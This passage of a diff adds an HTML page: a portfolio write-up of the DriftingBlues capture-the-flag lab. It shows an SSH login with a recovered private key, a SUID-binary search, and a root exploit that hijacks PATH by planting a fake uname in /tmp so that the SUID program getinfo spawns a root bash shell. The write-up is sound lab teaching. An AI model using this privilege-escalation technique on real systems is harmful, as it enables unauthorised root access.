+                                                        <img class="img-fluid" src="assets/img/driftingblues/viewrsa.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal16" tabindex="-1" role="dialog" aria-labelledby="portfolioModal16Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/viewrsa.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    I used nano to save the key to a file called priv_key and use chmod 600<br>
+                                                    Now login to ssh with user robertj and key as priv_key<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    ssh robertj@192.168.1.5 -i priv_key<br>
+                                                    </p>
+                                                    <p class="lead text-dark mt-5 ml-4" ></p>
+                                                    After login, you can now open the user flag user.txt
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal17">
+                                                        
+                              
+                                                        <img class="img-fluid" src="assets/img/driftingblues/usertxt.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal17" tabindex="-1" role="dialog" aria-labelledby="portfolioModal17Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/usertxt.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Heading-->
+                                            <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Exploiting Root Flag</h2>
+                                            
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    For escalating privileges, we can try by finding sudo permissions for user robertj.<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    find / -type f -perm -4000 -exec ls -l {} ; 2>/dev/null
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal52">
+                                                        
+                                                            
+                              
+                                                        <img class="img-fluid" src="assets/img/driftingblues/findperm.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal52" tabindex="-1" role="dialog" aria-labelledby="portfolioModal52Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/findperm.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    There is a command /usr/bin/getinfo which appears vulnerable<br>
+                                                    If you run the command /usr/bin/getinfo you get the information like IP, hostname and os info
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal53">
+                                                        
+                                                            
+                                      
+                                                        <img class="img-fluid" src="assets/img/driftingblues/getinfo.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal53" tabindex="-1" role="dialog" aria-labelledby="portfolioModal53Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/getinfo.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    If you cat /usr/bin/getinfo, you can see the commands which are showing us this info like ip a, cat /etc/hosts, uname -a<br>
+                                                    If we can modify any of these commands to open bash, we can get root shell<br>
+                                                    Go to the /tmp directory and create a file uname and let the uname execute /bin/bash command<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    echo ‘/bin/bash’ > uname<br>
+                                                    </p>
+                                                    <p class="lead text-dark mt-5 ml-4" >
+                                                    Make it executable with chmod 777 uname<br>
+                                                    We will use the bash environment variable concept to set /tmp directory to PATH variable<br>
+                                                </p>
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    export PATH=/tmp/:$PATH
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal54">
+                                                        
+                                                            
+                                           
+                                                        <img class="img-fluid" src="assets/img/driftingblues/exportpath.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal54" tabindex="-1" role="dialog" aria-labelledby="portfolioModal54Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/exportpath.png" alt="" />
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Now run the /usr/bin/getinfo and then you will get the root shell<br>
+                                                    Go to /root directory and you will get the root flag root.txt
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal55">
+                                                        
+                                                            
+                                 
+                                                        <img class="img-fluid" src="assets/img/driftingblues/rootflag.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal55" tabindex="-1" role="dialog" aria-labelledby="portfolioModal55Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/driftingblues/rootflag.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    Thanks for reading! :)   
+                                                    </p>                      
+                                                </div>
+                                            </div>    
+
+
+            </div>
+        </section>
+
+
+        <!-- Copyright Section-->
+        <div class="copyright py-4 text-center text-white">
+            <div class="container"><small>Copyright © NikitPenkar 2021</small></div>
+        </div>
+        <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes)-->
+        <div class="scroll-to-top d-lg-none position-fixed">
+            <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top"><i class="fa fa-chevron-up"></i></a>
+        </div>
+
+        <!-- Bootstrap core JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Third party plugin JS-->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
+        <!-- Contact form JS-->
+        <script src="assets/mail/jqBootstrapValidation.js"></script>
+        <script src="assets/mail/contact_me.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
